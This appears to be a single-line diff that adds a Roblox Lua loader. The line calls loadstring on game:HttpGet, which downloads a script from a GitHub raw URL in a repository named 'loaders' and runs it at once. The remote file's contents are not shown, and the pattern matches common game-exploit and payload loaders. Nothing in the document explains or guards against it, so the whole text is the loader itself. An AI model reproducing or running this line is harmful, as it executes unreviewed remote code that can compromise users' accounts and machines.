@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/electricity-bricklayer-spam0-hmdugc0im012fr.lua"))()
